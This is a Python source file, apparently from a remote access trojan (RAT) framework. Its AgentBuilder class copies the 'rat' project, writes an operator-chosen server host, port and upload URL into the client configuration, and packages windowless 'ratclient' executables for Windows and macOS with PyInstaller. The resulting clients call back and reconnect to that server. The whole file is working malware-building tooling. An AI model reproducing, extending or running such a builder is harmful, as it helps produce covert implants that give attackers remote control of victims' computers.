import os
import shutil
import subprocess
import tempfile
import platform

from core.utils.logger import logger


class AgentBuilder:
    """Agent 生成器"""

    # 需要排除的目录
    EXCLUDE_DIRS = {'venv', '__pycache__', '.git', 'node_modules', 'dist', 'build', '.idea', '.vscode', 'runtime'}
    EXCLUDE_EXTENSIONS = {'.pyc', '.pyo', '.pyd'}

    def __init__(self):
        self.source_dir = os.path.abspath('.')
        self.output_dir = os.path.abspath(os.path.join('runtime', 'agent_output'))
        self._ensure_dirs()

    def _ensure_dirs(self):
        os.makedirs(self.output_dir, exist_ok=True)

    def build_agent(self, server_host: str, server_port: int,
                    web_port: int, target_os: str = 'mac',
                    builder: str = 'pyinstaller') -> dict:
        """
        构建 Agent
        """
        if target_os not in ['win', 'mac']:
            raise ValueError(f'Unsupported target OS: {target_os}')

        if builder != 'pyinstaller':
            raise ValueError(f'Unsupported builder: {builder}')

        work_dir = tempfile.mkdtemp(prefix='agent_build_')

        try:
            # 复制客户端源码（排除无用目录）
            client_copy = os.path.join(work_dir, 'rat')
            self._copy_source_with_excludes(self.source_dir, client_copy)
            logger.info(f'临时文件：{os.path.abspath(client_copy)}')

            # 注入配置
            self._inject_config(client_copy, server_host, server_port, web_port)

            # 根据目标系统构建
            if target_os == 'win':
                result = self._build_windows(client_copy, work_dir)
            else:
                result = self._build_macos(client_copy, work_dir)

            # 复制产物到输出目录
            output_path = os.path.join(self.output_dir, result['file_name'])
            shutil.copy2(result['file_path'], output_path)

            return {
                'file_path': output_path,
                'file_name': result['file_name'],
                'size': os.path.getsize(output_path),
                'work_dir': work_dir
            }

        except Exception as e:
            shutil.rmtree(work_dir, ignore_errors=True)
            raise

    def _copy_source_with_excludes(self, src: str, dst: str):
        """复制源码，排除无用目录"""
        shutil.copytree(
            src, dst,
            ignore=shutil.ignore_patterns(
                *[f'*/{d}' for d in self.EXCLUDE_DIRS],
                *[f'*{ext}' for ext in self.EXCLUDE_EXTENSIONS]
            ),
            ignore_dangling_symlinks=True
        )

    def _inject_config(self, client_dir: str, server_host: str, server_port: int, web_port: int):
        """直接用模板替换 config.py"""
        config_path = os.path.join(client_dir, 'client', 'config', 'config.py')

        template = f'''import os

SERVER_HOST = "{server_host}"
SERVER_PORT = {server_port}
SERVER_ADDR = (SERVER_HOST, SERVER_PORT)

SERVER_WEB_SCHEME = "http"
SERVER_WEB_HOST = "{server_host}"
SERVER_WEB_PORT = {web_port}
UPLOAD_BASE_URL = f"{{SERVER_WEB_SCHEME}}://{{SERVER_WEB_HOST}}:{{SERVER_WEB_PORT}}"

RECONNECT_INTERVAL_SECONDS = 10
JOB_PATH = os.path.join(os.getcwd(), 'jobs', 'builtins')
'''

        with open(config_path, 'w', encoding='utf-8') as f:
            f.write(template)

    def _build_macos(self, client_dir: str, work_dir: str) -> dict:
        """macOS 构建"""
        cmd = [
            'pyinstaller', '-F', '-w', 'ratclient.py',
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ]

        result = subprocess.run(
            cmd,
            cwd=client_dir,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        os.chmod(exe_path, 0o755)

        return {
            'file_path': exe_path,
            'file_name': 'ratclient_mac'
        }

    def _build_windows(self, client_dir: str, work_dir: str) -> dict:
        """Windows 构建"""
        cmd = [
            'pyinstaller', '-F', '-w', 'ratclient.py',
            '--hidden-import', 'client.commands.platform.mac',
            '--hidden-import', 'client.commands.platform.win',
            '--hidden-import', 'client.commands.platform.linux',
        ]

        result = subprocess.run(
            cmd,
            cwd=client_dir,
            capture_output=True,
            text=True,
            shell=True
        )

        if result.returncode != 0:
            raise RuntimeError(f'PyInstaller failed: {result.stderr}')

        exe_path = os.path.join(client_dir, 'dist', 'ratclient.exe')
        if not os.path.exists(exe_path):
            raise RuntimeError(f'Build output not found: {exe_path}')

        return {
            'file_path': exe_path,
            'file_name': 'ratclient.exe'
        }

    def cleanup(self, work_dir: str):
        """清理临时目录"""
        if work_dir and os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)